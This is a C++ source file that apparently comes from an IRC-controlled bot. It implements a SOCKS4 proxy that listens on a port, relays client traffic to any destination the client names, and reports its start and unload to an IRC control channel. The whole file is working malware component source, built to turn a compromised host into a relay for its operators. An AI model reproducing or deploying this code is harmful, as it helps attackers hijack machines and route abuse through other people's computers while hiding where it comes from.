
#include "main.h"
#include "redir_socks.h"
#include "mainctrl.h"
#include "utility.h"

CRedirectSOCKS_Thread::CRedirectSOCKS_Thread() { m_sRedirectName.Assign("Socks4"); }

#define SOCKS4_CONNECT	1
#define SOCKS4_BIND		2
#define SOCKS4_GRANT	90
#define SOCKS4_REJECT	91

struct socks4_hdr {
	char vn;
	char cd;
	unsigned short destport;
	unsigned long destaddr;
	char userid[1024];
};

void CRedirectSOCKS_Thread::StartRedirect()
{	
	char svn;
	if(xRead(m_sClientSocket, &svn, 1)<1) { xClose(m_sClientSocket); return; }

	switch(svn)
	{
	case 69:
		break;
	case 4:
		{
			struct socks4_hdr hdr4; sockaddr_in addrHost; int sServer;

			if(xRead(m_sClientSocket,&hdr4.cd,sizeof(hdr4)-2)<1) { xClose(m_sClientSocket); return; }

			if(hdr4.cd==SOCKS4_CONNECT)
			{
				memset(&addrHost, 0, sizeof(addrHost)); addrHost.sin_family=AF_INET;
				addrHost.sin_port=hdr4.destport; addrHost.sin_addr.s_addr=hdr4.destaddr;
				
				sServer=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
				
				if(connect(sServer,(sockaddr*)&addrHost, sizeof(addrHost))==SOCKET_ERROR)
				{
					hdr4.vn=0; hdr4.cd=SOCKS4_REJECT;
					memset(&hdr4.userid, 0, 1024);
					xWrite(m_sClientSocket, (char*)&hdr4, 8);
					xClose(m_sClientSocket);
					return;
				}

				hdr4.vn=0; hdr4.cd=SOCKS4_GRANT;
				memset(&hdr4.userid, 0, 1024);
				xWrite(m_sClientSocket, (char*)&hdr4, 8);

				int iLen; char szBuf[1024]; fd_set fd;

				SET_SOCK_BLOCK(m_sClientSocket, 0); SET_SOCK_BLOCK(sServer, 0);

				while(true)
				{
					iLen=xRead(sServer, szBuf, sizeof(szBuf));
					if(!iLen) break; if(iLen<0 && ERRNO!=EWOULDBLOCK) { Sleep(10); continue; }
					xWrite(m_sClientSocket, szBuf, iLen);

					iLen=xRead(m_sClientSocket, szBuf, sizeof(szBuf));
					if(!iLen) break; if(iLen<0 && ERRNO!=EWOULDBLOCK) { Sleep(10); continue; }
					xWrite(sServer, szBuf, iLen);
				}

				xClose(m_sClientSocket); xClose(sServer);
			}

		}
		break;
	default:
		break;
	}
}

CRedirectSOCKS::CRedirectSOCKS() { m_sRedirectName.Assign("Socks4"); }

void CRedirectSOCKS::StartRedirect()
{	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "[%s] Starting Socks4 Proxy on port %d.", \
								  m_sRedirectName.CStr(), m_iLocalPort);

	m_sListenSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(m_sListenSocket==SOCKET_ERROR) return;

	sockaddr_in ssin, cssin; memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family=AF_INET; ssin.sin_port=htons(m_iLocalPort);
	socklen_t clen=sizeof(cssin);

	if(bind(m_sListenSocket, (sockaddr*)&ssin, sizeof(ssin))!=0)
	{	xClose(m_sListenSocket); return; }

	while(m_pRedirect->m_bRedirecting)
	{	if(listen(m_sListenSocket, 10)==SOCKET_ERROR) { Sleep(250); continue; }
		int sClientSocket=accept(m_sListenSocket, (sockaddr*)&cssin, &clen);
#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(1, "CRedirectSOCKS(0x%8.8Xh): Accepted connection from %s...\n", this, inet_ntoa(to_in_addr(cssin.sin_addr.s_addr)));
#endif
		if(sClientSocket!=SOCKET_ERROR && sClientSocket!=0)
		{	CRedirectSOCKS_Thread *pTemp=new CRedirectSOCKS_Thread;
			pTemp->m_pRedirect=m_pRedirect; pTemp->m_pRedirSOCKS=this;
			pTemp->m_iLocalPort=m_iLocalPort; pTemp->m_sClientSocket=sClientSocket;
			pTemp->m_sReplyTo.Assign(m_sReplyTo); pTemp->m_bSilent=m_bSilent; pTemp->m_bNotice=m_bNotice;
			pTemp->Start(); }
		else
		{	break; } }

	if(m_sListenSocket!=INVALID_SOCKET) xClose(m_sListenSocket);


	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "[%s] Unloaded proxy on %d.", \
								  m_sRedirectName.CStr(), m_iLocalPort); }
